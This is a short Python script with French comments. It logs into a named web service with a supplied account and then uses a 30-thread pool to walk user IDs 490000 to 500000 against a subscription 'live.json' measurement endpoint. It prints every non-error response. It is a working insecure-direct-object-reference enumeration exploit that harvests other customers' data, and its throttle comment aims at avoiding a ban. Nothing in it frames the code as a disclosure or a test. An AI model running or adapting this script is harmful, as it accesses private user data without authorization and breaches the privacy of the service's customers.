import requests
from concurrent.futures import ThreadPoolExecutor
import time

#replace username, password, CNT ID
USERNAME = "foobar@network.com"
PASSWORD = "passwd"
CNT_ID = "1234567890"


BASE_URL = "https://esoftlink.esoftthings.com"

# ----------------------------
# SESSION LOGIN
# ----------------------------
session = requests.Session()

login_url = f"{BASE_URL}/login_check"

r = session.post(
    login_url,
    data={
        "_username": USERNAME,
        "_password": PASSWORD
    },
    allow_redirects=False,
    timeout=10
)

cookies = session.cookies.get_dict()

if "PHPSESSID" not in cookies:
    print("Login failed - no PHPSESSID")
    exit(1)

print(f"[+] PHPSESSID={cookies['PHPSESSID']}")

# ----------------------------
# WORKER
# ----------------------------
def check_user(user_id):
    url = f"{BASE_URL}/api/subscription/{user_id}/{CNT_ID}/measure/live.json"

    try:
        r = session.get(url, timeout=5)

        # filtre comme ton script bash
        if '"error"' not in r.text:
            print(f"\nUserId={user_id}")
            print(r.text)
            print("-" * 40)

    except requests.RequestException:
        pass

    # léger throttle pour éviter ban / overload serveur
    time.sleep(0.01)

# ----------------------------
# THREAD POOL CONFIG
# ----------------------------
THREADS = 30  # ajuste selon ta machine (20-50 OK)

print("[+] Scanning...")

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    for user_id in range(490000, 500000):
        executor.submit(check_user, user_id)
